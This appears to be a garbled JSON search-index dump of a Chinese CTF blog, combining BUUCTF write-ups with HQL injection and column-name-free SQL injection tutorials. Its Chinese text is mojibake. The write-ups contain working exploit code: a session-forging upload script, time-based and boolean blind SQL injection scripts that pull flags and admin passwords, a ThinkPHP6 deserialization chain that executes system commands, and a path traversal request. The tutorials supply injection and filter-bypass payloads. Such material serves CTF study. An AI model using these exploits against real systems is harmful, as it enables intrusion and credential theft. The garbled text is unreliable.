(RuntimeException $e) { $download_result = $e-\u0026gt;getMessage(); } exit; } ?\u0026gt; ç”±äºsessionæ˜¯PHPSESSIDæˆ‘ä»¬ç›´æ¥sess_sessidæŸ¥çœ‹sessionæ–‡ä»¶\nå¤„ç†å™¨åº”è¯¥ä¸ºphp_binary\nè„šæœ¬ä¼ªé€ sessionæ–‡ä»¶\n1 2 3 4 5 6 \u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_binary\u0026#39;); session_save_path(\u0026#34;./\u0026#34;); session_start(); $_SESSION[\u0026#39;username\u0026#39;] = \u0026#39;admin\u0026#39;; æ–‡ä»¶åæ”¹ä¸ºsessï¼Œåˆ©ç”¨hash_fileæ¥è®¡ç®—sha256\n1 2 \u0026lt;?php echo hash_file(\u0026#39;sha256\u0026#39;, \u0026#39;./sess\u0026#39;); å¾—åˆ°æ–‡ä»¶åsess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4\nä¸Šä¼ ç”¨postman\næˆ–è€…è„šæœ¬ä¼ \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests import hashlib from io import BytesIO def BeAdmin(): # print(BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) files = { \u0026#34;up_file\u0026#34;: (\u0026#34;sess\u0026#34;, BytesIO(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;))) } data = { \u0026#39;attr\u0026#39;:\u0026#39;.\u0026#39;, \u0026#39;direction\u0026#39;:\u0026#39;upload\u0026#39; } url = \u0026#39;http://375fb983-49c0-4074-a8e6-6c98e5206ddc.node5.buuoj.cn:81/\u0026#39; r = requests.post(url=url,data=data,files=files) session_id = hashlib.sha256(\u0026#39;\\x08usernames:5:\u0026#34;admin\u0026#34;;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() return session_id è¿™é‡Œæˆ‘ç”¨apifox,ä¸Šä¼ ç”¨upload\næ¥ç€ä¸Šä¼ success.txt\nç„¶åæŠŠsessionå€¼æ”¹ä¸€ä¸‹å°±è¡Œäº†\n[SWPU2019]Web4 ä¸Šæ¥ç›²æ³¨å‡ºå¤‡ä»½æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #author: c1e4r import requests import json import time def main(): #é¢˜ç›®åœ°å€ url = \u0026#39;\u0026#39;\u0026#39;http://f30f0574-3492-4a09-a14f-203db6705c1a.node5.buuoj.cn:81/index.php?r=Login/Login\u0026#39;\u0026#39;\u0026#39; #æ³¨å…¥payload payloads = \u0026#34;asd\u0026#39;;set @a=0x{0};prepare ctftest from @a;execute ctftest-- -\u0026#34; flag = \u0026#39;\u0026#39; for i in range(1,30): #æŸ¥è¯¢payload payload = \u0026#34;select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)\u0026#34; for j in range(0,128): #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç  datas = {\u0026#39;username\u0026#39;:payloads.format(str_to_hex(payload.format(i,j))),\u0026#39;password\u0026#39;:\u0026#39;test213\u0026#39;} data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times \u0026gt;= 3: flag = flag + chr(j) print(flag) break def str_to_hex(s): return \u0026#39;\u0026#39;.join([hex(ord(c)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;) for c in s]) if __name__ == \u0026#39;__main__\u0026#39;: main() glzjin_wants_a_girl_friend.zip\nå®¡è®¡æºç å‘ç°listdataè¿™ä¸ªå˜é‡å¯æ§ï¼Œuserindex.phpé‡Œé¢å¯ä»¥ä¼ å…¥img_fileè·Ÿflagè·¯å¾„å°±å¯ä»¥è¯»å–äº†\n1 index.php?r=User/Index\u0026amp;img_file=/../flag.php [å®‰æ´µæ¯ 2019]iamthinking www.zipä¸‹è½½æºç \nthinkphp6ååºåˆ—åŒ–\næœ€åä¸€æ­¥è¦ç”¨parse_urlçš„æ¼æ´åŠ //å°±è¡Œ\npocå·¥å…·https://github.com/wh1t3p1g/phpggc\nåˆ©ç”¨é“¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 think\\Model --\u0026gt; __destruct() think\\Model --\u0026gt; save() think\\Model --\u0026gt; updateData() think\\Model --\u0026gt; checkAllowFields() think\\Model --\u0026gt; db() ååŠéƒ¨åˆ†åˆ©ç”¨é“¾ï¼ˆåŒtp 5.2ååŠéƒ¨åˆ†åˆ©ç”¨é“¾) think\\model\\concern\\Conversion --\u0026gt; __toString() think\\model\\concern\\Conversion --\u0026gt; __toJson() think\\model\\concern\\Conversion --\u0026gt; __toArray() think\\model\\concern\\Attribute --\u0026gt; getAttr() think\\model\\concern\\Attribute --\u0026gt; getValue() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 \u0026lt;?php namespace think\\model\\concern { trait Conversion { } trait Attribute { private $data; private $withAttr = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;system\u0026#34;]; public function get() { $this-\u0026gt;data = [\u0026#34;xxx\u0026#34; =\u0026gt; \u0026#34;cat /flag\u0026#34;]; } } } namespace think{ abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; protected $withEvent; private $exists; private $force; protected $field; protected $schema; protected $table; function __construct(){ $this-\u0026gt;lazySave = true; $this-\u0026gt;withEvent = false; $this-\u0026gt;exists = true; $this-\u0026gt;force = true; $this-\u0026gt;field = []; $this-\u0026gt;schema = []; $this-\u0026gt;table = true; } } } namespace think\\model{ use think\\Model; class Pivot extends Model { function __construct($obj=\u0026#39;\u0026#39;) { //å®šä¹‰this-\u0026gt;dataä¸ä¸ºç©º parent::__construct(); $this-\u0026gt;get(); $this-\u0026gt;table = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b)); } [PASECA2019]honey_shop å›¾ç‰‡æœ‰ä»»æ„æ–‡ä»¶è¯»å–\nè¯»å–proc/self/enviorn\nè¯»åˆ°secretkeyä¼ªé€ session\n1 F5SmhLBQtsPYGpBRZxe56E0Nwk7LJ369gSI2Kl4h [Black Watch å…¥ç¾¤é¢˜]Web ç›²æ³¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import requests flag=\u0026#39;\u0026#39; #æŸ¥åº“å payload1 = \u0026#39;1^(ascii(substr((select(database())),{},1))\u0026gt;{})^1\u0026#39; #åº“åä¸ºnews #æŸ¥è¡¨å payload2 = \u0026#39;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\\u0026#39;news\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #è¡¨åä¸ºadmin,contents #æŸ¥å­—æ®µ payload3 = \u0026#39;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\\\u0026#39;contents\\\u0026#39;)),{},1))\u0026gt;{})^1\u0026#39; #adminè¡¨é‡Œæœ‰id,username,password,is_enable # contentsè¡¨é‡Œæœ‰id,title,content,is_enable #æŸ¥å­—æ®µå€¼ payload4 = \u0026#39;1^(ascii(substr((select(group_concat(password))from(admin)),{},1))\u0026gt;{})^1\u0026#39; #åˆ†åˆ«æŸ¥usernameå’Œpassword for i in range(1,100): low =28 high =137 mid = (low + high) // 2 while(low \u0026lt; high): url = \u0026#39;http://f695d102-a73b-4b8a-a546-b63ea583f09f.node5.buuoj.cn:81/backend/content_detail.php?id=\u0026#39; payload = payload4.format(i,mid) url+=payload print(url) r = requests.get(url) text = str(r.json()) if \u0026#34;æœ­å¸ˆå‚…ç¼ºä¸ªå¥³æœ‹å‹\u0026#34; in text: low = mid + 1 else: high = mid mid = (low + high) // 2 if(chr(mid)==\u0026#39;\u0026#39;): break flag +=chr(mid) print(flag) print(flag) [GoogleCTF2019 Quals]Bnv ","date":"2025-01-10T00:00:00Z","image":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png","permalink":"https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/","title":"buuctfåˆ·é¢˜"},{"content":"HQLæ³¨å…¥ï¼ˆHibernateæ¡†æ¶ï¼‰ Hibernateæ˜¯ä¸€ç§ORMæ¡†æ¶ï¼Œå®ƒæ˜¯æ”¯æŒä½¿ç”¨åŸç”ŸSQLæˆ–HQLè¯­è¨€(Hibernateæ¡†æ¶è‡ªå·±çš„è¯­è¨€)è¿›è¡ŒSQLæ“ä½œçš„\né€šå¸¸ä½¿ç”¨Hibernateæ¡†æ¶éƒ½æ˜¯ä½¿ç”¨HQLè¯­è¨€æ–¹å¼è¿›è¡ŒæŸ¥è¯¢\n1ã€åŸç”ŸSQLè¯­å¥\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createSQLQuery(\u0026#34;SELECT table_name FROM information_schema.tables where table_schema=?\u0026#34;); query.setParameter(1, parameter); 2ã€HQLè¯­å¥\nå°†æ•°æ®åº“tablesæ˜ å°„ä¸ºç›¸å…³çš„ç±»ï¼Œé€šè¿‡æ­¤ç±»è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œä½¿ç”¨çš„æ˜¯HQLè‡ªå·±çš„è¯­è¨€\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createQuery(\u0026#34;from com.demo.bean.User where tableschema = ?1\u0026#34;, User.class); query.setParameter(1, parameter); 1ã€Hibernateæ¡†æ¶é¦–å…ˆä¼šå»è§£æcreateQuery()å‡½æ•°ä¸­è¯­å¥æ˜¯å¦ç¬¦åˆHQLè¯­æ³•ï¼Œä¸ç¬¦åˆåˆ™ä¼šHQLè¯­æ³•é”™è¯¯\n2ã€ç¬¦åˆHQLè¯­æ³•åï¼ŒHQLæ¡†æ¶ä¼šå°†è¯­å¥è§£ææˆå¯¹åº”æ•°æ®åº“çš„åŸç”ŸSQLè¯­å¥\n3ã€æœ€åå°†åŸç”ŸSQLè¯­å¥å»æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢è·å–ç»“æœï¼Œæ­¤æ—¶åŸç”ŸSQLè¯­å¥å¦‚æœä¸æ­£ç¡®åˆ™ä¼šå¯¼è‡´æ•°æ®åº“å±‚é¢çš„æŠ¥é”™ï¼ˆä¸åŒæ•°æ®åº“åˆ™æ˜¯ä¸åŒçš„æŠ¥é”™äº†ï¼‰\n1 2 3 1ã€information_schema.tablesè¡¨åæ˜ å°„ä¸ºcom.demo.bean.Userç±» 2ã€table_nameå­—æ®µæ˜ å°„ä¸ºtablename 3ã€table_schemaå­—æ®µæ˜ å°„ä¸ºtableschema ç®€å•HQLå±‚é¢æ³¨å…¥ unionæŸ¥è¯¢åœ¨5.6.15ç‰ˆæœ¬ä¹‹å‰ä¸æ”¯æŒ\n1 name=mysql\u0026#39; union select 1,\u0026#39;2 #æŠ¥é”™ 6.xç‰ˆæœ¬å¼€å§‹æ”¯æŒunionæŸ¥è¯¢ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½åˆ©ç”¨HQLè¯­æ³•\n1 name=mysql\u0026#39; union from User where \u0026#39;1\u0026#39;=\u0026#39;1 ä¸èƒ½ä½¿ç”¨å•è¡Œæ³¨é‡Š#æˆ–+--+\n1 2 3 ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;+--+ #æŠ¥é”™ ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# #æŠ¥é”™ ?name=mysql\u0026#39;and#%0d%0a\u0026#39;1\u0026#39;=\u0026#39;1 #æŠ¥é”™ ä¸æ”¯æŒ*æŸ¥è¯¢\n1 ?name=mysql\u0026#39; and (select * from User where tablename=\u0026#39;user\u0026#39;)=\u0026#39;user æ€ä¹ˆæŸ¥è¯¢ï¼š\n1ã€å¦‚æœæœ‰æŠ¥é”™ä¿¡æ¯çš„è¯ï¼Œé‚£å°±æ ¹æ®æŠ¥é”™å›æ˜¾å»çœ‹è¡¨åã€åˆ—åï¼Œæ ¹æ®è¡¨åè¿›è¡Œç›²æ³¨æˆ–æŠ¥é”™æ³¨å…¥æŸ¥è¯¢æ•°æ®ã€‚æˆ–è€…æ ¹æ®å›æ˜¾å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„è¡¨åå’Œåˆ—åï¼Œç„¶åè¿›è¡ŒæŸ¥è¯¢æ•°æ®\n2ã€å¦‚æœæ²¡æœ‰æŠ¥é”™ä¿¡æ¯çš„è¯\nä½¿ç”¨andæˆ–orè¿›è¡Œåˆ—åçš„æšä¸¾\n1 ?name=mysql\u0026#39; and xxxxx = \u0026#39;1 ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡Œè¡¨åæšä¸¾\n1 ?name=mysql\u0026#39;or+(select+1+from+XXXX+where+1=2)=\u0026#39;1 HQLæ³¨å…¥çš„å¸¸è§ç±»å‹å¯ä»¥æ€»ç»“ä¸ºä¸¤ç§ï¼šå¸ƒå°”ç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥ã€‚\nHQLæ³¨å…¥éœ€è¦ä¸¤æ¬¡or\né€ƒé€¸HQLå±‚é¢æ³¨å…¥ ä½äº5.xç‰ˆæœ¬é€ƒé€¸ 1ã€åœ¨5.6.15ä¹‹å‰ï¼ŒWHEREå­å¥ä¸­æ˜¯å¯ä»¥ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„ï¼Œè¿™å°±è¯´æ˜æ•°æ®åº“æœ¬èº«çš„å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„\n1 2 updatexml() version() 2ã€åœ¨5.6.15ç‰ˆæœ¬ä¹‹å‰ï¼Œå­˜åœ¨ç€å¯¹å•å¼•å·è½¬ä¹‰çš„å·®å¼‚å¯¼è‡´çš„é€ƒé€¸é—®é¢˜\nåœ¨HQLè¯­è¨€ï¼Œå­—ç¬¦ä¸²å’Œå¸¸è§„SQLè¯­å¥ä¸€æ ·éƒ½æ˜¯ä½¿ç”¨å•å¼•å·åŒ…è£¹\n1 from Tables where name = \u0026#39;mysql\u0026#39; å¼•æ“æ˜¯ä¸ä¼šå¯¹å­—ç¬¦ä¸²é‡Œé¢çš„å†…å®¹è¿›è¡Œè§£æçš„\nå½“åœ¨å­—ç¬¦ä¸²ä¸­åŠ å…¥ä¸€ä¸ªè½¬è¯‘å­—ç¬¦\n1 from Tables where name = \u0026#39;mysql\\\u0026#39; HQLå¼•æ“æ˜¯ä¸è¯†åˆ«è½¬è¯‘å­—ç¬¦\\çš„ï¼Œå®ƒä¼šå°†tony\\ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŸå°ä¸åŠ¨çš„è½¬ä¸ºmysqlè¯­å¥\næ­¤å¤„å°±å¯¼è‡´äº†ä¸€ä¸ªå·®å¼‚ï¼Œmysqlæ˜¯è¯†åˆ«è½¬è¯‘å­—ç¬¦çš„ï¼Œæ‰€ä»¥çˆ†äº†è¯­æ³•é”™è¯¯\nç„¶ååˆ©ç”¨è¿™ä¸ªå·®å¼‚ï¼Œæ„é€ ä¸€ä¸ªHQLä»¥ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œä½†è½¬ä¸ºmysqlå˜æˆè¯­å¥çš„POCå³å¯\n1 mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()# æ‹¼æ¥HQLè¯­å¥ï¼Œæ­¤æ—¶mysql\\''and+1=2+union+select+user(),version()#æ˜¯ä¸€æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¼•æ“ä¸å»è§£æ\n1 from Tables where name = \u0026#39;mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()#\u0026#39; è½¬ä¸ºsqlè¯­å¥ï¼Œè¿™æ ·å°±åœ¨ä½äº5.xçš„ç‰ˆæœ¬å®ç°ç”¨unionè¿›è¡Œæ³¨å…¥\né«˜äº6.x ç‰ˆæœ¬é€ƒé€¸ 1ã€ä»6.0.1.Finalç‰ˆæœ¬å¼€å§‹ï¼Œæµ‹è¯•å‘ç°è½¬è¯‘ç¬¦\\å¤±æ•ˆ\næ‰€ä»¥æ— æ³•ç”¨\\æ¥é€ƒé€¸\n2ã€åœ¨6.xç‰ˆæœ¬ä¸­å‘ç°æ–°å¢äº†ä¸€ä¸ªsql()å‡½æ•°ï¼Œåœ¨5.xç‰ˆæœ¬æ˜¯ä¸æ”¯æŒçš„\næ„æ€å°±æ˜¯å¯ä»¥æ‰§è¡ŒSQLè¯­å¥ï¼Œä¸»è¦æ˜¯ä¸¤ç§æ–¹å¼\n1 2 sql(\u0026#39;select 1,2,3\u0026#39;) sql(\u0026#39;select 1,2,?\u0026#39;,\u0026#39;3\u0026#39;) 1ã€ç¬¬ä¸€ç§æ˜¯å°†å‡½æ•°é‡Œé¢çš„å­—ç¬¦ä¸²ç›´æ¥æ‹¼æ¥SQLè¯­å¥ä¸­ï¼Œç„¶åå»æ‰§è¡Œ\n2ã€ç¬¬äºŒç§å°±æ˜¯å°†åé¢å‚æ•°é¢„ç¼–è¯‘æ›¿æ¢å ä½ç¬¦?ï¼Œç„¶åå†æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­æ‰§è¡Œ\n1 ?name=mysql\u0026#39; and sql(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39;1 é€šç”¨ç‰ˆæœ¬é€ƒé€¸ æœ‰ä¸€ä¸ªå‡½æ•°åœ¨5.xå’Œ6.xéƒ½èƒ½ä½¿ç”¨ï¼Œé‚£å°±æ˜¯JPQLè¯­è¨€çš„function()å‡½æ•°\nåœ¨Hibernateæ¡†æ¶ä¸­æ˜¯åŒæ—¶æ”¯æŒJPQLè¯­è¨€å’ŒHQLè¯­è¨€çš„\nfunction()å‡½æ•°æ˜¯ç”¨æ¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–æ•°æ®åº“è‡ªå¸¦å‡½æ•°çš„ï¼Œå’ŒæŸäº›åŠ¨æ€å‡½æ•°è°ƒç”¨å·®ä¸å¤šå§\n1 2 3 4 function(\u0026#39;version\u0026#39;) =\u0026gt; version() function(\u0026#39;updatexml\u0026#39;,1,1,1) =\u0026gt; updatexml(1,1,1) function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;\u0026#39;bbbb(1,1,1) 5.xç‰ˆæœ¬ function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;bbbb(1,1,1) 6.xç‰ˆæœ¬ å®ƒé¦–å…ˆå°†ç¬¬ä¸€å‚æ•°ä½œä¸ºå‡½æ•°åï¼Œéšåæ‹¼æ¥ä¸€ä¸ªæ‹¬å·ï¼Œåé¢çš„å‚æ•°åˆ™æ˜¯æ‹¬å·é‡Œçš„å†…å®¹\nè€Œfunction()å‡½æ•°çš„åˆ©ç”¨å’Œsql()å‡½æ•°ä¸€æ ·ï¼Œæ˜¯ç›´æ¥æ‹¼æ¥åœ¨è§£æåçš„SQLè¯­å¥ä¸­çš„ï¼Œè€Œä¸”ç¬¬ä¸€å‚æ•°çš„å†…å®¹æ²¡æœ‰ä»»ä½•é™åˆ¶\nè¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªå¯åˆ©ç”¨POCäº†\n1 ?name=mysql\u0026#39; and function(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39; ","date":"2024-11-08T00:00:00Z","image":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/","title":"HQLæ³¨å…¥"},{"content":"æ— åˆ—åæ³¨å…¥ sqlæ³¨å…¥ä¸€èˆ¬éƒ½ä¼šç”¨åˆ°information_schemaè¿™ä¸ªåº“ï¼ˆmysqlè‡ªå¸¦çš„åº“ï¼‰ï¼Œæ‰€ä»¥banæ‰è¿™ä¸ªè¡¨æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é˜²å¾¡æ‰‹æ®µï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥æ¥ç»•è¿‡ã€‚\nInnoDbå¼•æ“ mysql 5.5.8ä¹‹åå¼€å§‹ä½¿ç”¨InnoDbä½œä¸ºé»˜è®¤å¼•æ“ï¼Œmysql 5.6çš„InnoDbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨\nè¿™ä¸¤å¼ è¡¨è®°å½•äº†æ•°æ®åº“å’Œè¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰åˆ—å\n1 2 select group_concat(database_name) from mysql.innodb_index_stats; select group_concat(table_name) from mysql.innodb_table_stats where database_name=database() sysåº“ MySQL 5.7å¼€å§‹å¢åŠ äº†sysåº“ï¼Œè¿™ä¸ªåº“å¯ä»¥ç”¨äºå¿«é€Ÿäº†è§£ç³»ç»Ÿå…ƒæ•°æ®ä¿¡æ¯ã€‚sysåº“é€šè¿‡è§†å›¾çš„å½¢å¼æŠŠinformation_schemaå’Œperformance_schemaç»“åˆèµ·æ¥ï¼ŒæŸ¥è¯¢ä»¤äººå®¹æ˜“ç†è§£çš„æ•°æ®ã€‚\nsys.schema_auto_increment_columns è¿™ä¸ªè§†å›¾ç”¨äºä¿å­˜æœ‰è‡ªå¢å­—æ®µçš„æ•°æ®åº“ä¿¡æ¯ï¼Œä¸€èˆ¬è®¾è®¡è¡¨æ—¶éƒ½ä¼šè®¾ç½®è‡ªå¢å­—æ®µï¼ˆå¦‚idï¼‰\n1 2 3 4 #æŸ¥è¯¢æ•°æ®åº“å select table_schema from sys.schema_auto_increment_columns #æŸ¥è¯¢è¡¨å select table_name from sys.schema_auto_increment_columns where table_schema=databse() schema_table_statistics_with_buffer ä¸å­˜åœ¨è‡ªå¢å­—æ®µæ—¶ä½¿ç”¨schema_table_statistics_with_buffer\n1 2 3 4 5 6 # æŸ¥è¯¢æ•°æ®åº“ select table_schema from sys.schema_table_statistics_with_buffer; select table_schema from sys.x$schema_table_statistics_with_buffer; # æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“çš„è¡¨ select table_name from sys.schema_table_statistics_with_buffer where table_schema=database(); select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=database(); æ— åˆ—åæ³¨å…¥ ä¸Šè¿°çš„innodbå¼•æ“çš„è¡¨å’Œsysåº“çš„è¡¨éƒ½æ— æ³•æŸ¥åˆ°åˆ—åï¼Œè¿™é‡Œå°±éœ€è¦ä½¿ç”¨æ— åˆ—åæ³¨å…¥ã€‚\njoinã€using joinç”¨äºåˆå¹¶ä¸¤ä¸ªè¡¨ï¼Œusingè¡¨ç¤ºä½¿ç”¨ä»€ä¹ˆå­—æ®µè¿›è¡Œè¿æ¥ï¼Œç”¨usingæŒ‡å®šäº†è¿æ¥å­—æ®µåˆ™æŸ¥è¯¢ç»“æœåªè¿”å›è¿æ¥å­—æ®µ\n1 select * from user as b join user using(id) as c è¿™é‡Œä½¿ç”¨idè¿›è¡Œè¿æ¥ï¼Œåªä¼šè¿”å›idåˆ—\næ€è·¯ï¼šåˆ©ç”¨joinåˆå¹¶åŒä¸€è¡¨ï¼ŒæŠ¥é”™é‡å¤çš„åˆ—åï¼Œå†åˆ©ç”¨usingçˆ†å‡ºæ‰€æœ‰çš„åˆ—åï¼Œunion selectéœ€è¦å‰åæŸ¥è¯¢çš„å­—æ®µæ•°ä¸€æ ·ï¼Œä¸ç„¶ä¼šæŠ¥é”™\n1 2 3 4 5 6 7 8 # å¾—åˆ° id åˆ—åé‡å¤æŠ¥é”™ select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b)as c; # å¾—åˆ° username åˆ—åé‡å¤æŠ¥é”™ select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id))as c; # å¾—åˆ° password åˆ—åé‡å¤æŠ¥é”™ select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username))as c; # å¾—åˆ° user è¡¨ä¸­çš„æ•°æ® select * from user where id=\u0026#39;1\u0026#39; union all select * from (select * from user as a join user as b using(id,username,password))as c; å­æŸ¥è¯¢ åˆ©ç”¨unionè”åˆæŸ¥è¯¢æ„é€ åˆ—å\n1 select 1,2,3,4 union select * from users 1 2 3 select `2` from (select 1,2,3,4 union select * from users)a select a.2 from (select 1,2,3,4 union select * from users)a #è®°å¾—ç¬¬ä¸€ä¸ª2åŠ åå¼•å·,æˆ–è€…ä½¿ç”¨a.2 1 2 3 4 5 select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from user)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x; select * from user where id=\u0026#39;-1\u0026#39; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x; order byç›²æ³¨ order byå¯¹ç»“æœè¿›è¡Œæ’åºï¼š0-9 a-zï¼Œä¸åŒºåˆ†å¤§å°å†™\n1 2 3 select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;o\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;p\u0026#39; order by 3; select * from user where id=\u0026#39;id\u0026#39; union select 1,2,\u0026#39;q\u0026#39; order by 3; ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢ æ­£å¸¸çš„ sql æŸ¥è¯¢å¦‚ä¸‹ï¼š\n1 select * from `admin`; å…¶ä¸­ï¼Œåˆ—åä¸º idã€nameã€passwordï¼Œä½¿ç”¨ union æŸ¥è¯¢ï¼š\n1 select 1,2,3 union select * from admin; å¦‚å›¾ï¼Œæˆ‘ä»¬çš„åˆ—åè¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„æ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ•°å­—æ¥å¯¹åº”åˆ—ï¼Œå¦‚ 3 å¯¹åº”äº†è¡¨é‡Œé¢çš„ passwordï¼š\n1 select `3` from (select 1,2,3 union select * from admin)a; æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½åã€‚\nå½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œ` ä¼šè¢«è¿‡æ»¤ã€‚å½“ ```ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š\n1 select b from (select 1,2,3 as b union select * from admin)a; åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š\n1 select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3; payload\n1 select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1); ç›²æ³¨\n1 ((SELECT 1,concat(\u0026#39;{result+chr(mid)}\u0026#39;, cast(\u0026#34;0\u0026#34; as JSON)))\u0026lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`)) æ— select mysql 8.0.19æ–°å¢è¯­å¥table\nå¯ä»¥æŠŠtable tç®€å•ç†è§£æˆselect * from tï¼Œå’Œselectçš„åŒºåˆ«åœ¨äº\ntableæ€»æ˜¯æ˜¾ç¤ºè¡¨çš„æ‰€æœ‰åˆ— tableä¸å…è®¸ä»»ä½•çš„è¡Œè¿‡æ»¤;ä¹Ÿå°±æ˜¯è¯´ï¼ŒTABLEä¸æ”¯æŒä»»ä½•WHEREå­å¥ã€‚ å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å 1 2 admin\u0026#39;and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)\u0026gt; (BINARY(\u0026#39;{}\u0026#39;),\u0026#39;0\u0026#39;)# åŒæ—¶ä»£æ›¿selectè¢«è¿‡æ»¤å¯¼è‡´åªèƒ½åŒè¡¨æŸ¥è¯¢çš„é—®é¢˜\n","date":"2024-11-07T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","title":"æ— åˆ—åæ³¨å…¥"},{"content":"RCE è¿œç¨‹ä»£ç æ‰§è¡Œï¼šRemote Code Execute\nè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼šRemote Command Execute\nphp RCEå‡½æ•° å‘½ä»¤æ‹¼æ¥ç¬¦å· windows linux pikachué¶åœºç»ƒä¹  ping ç›´æ¥åœ¨ipå\u0026amp;åŠ å‘½ä»¤\neval 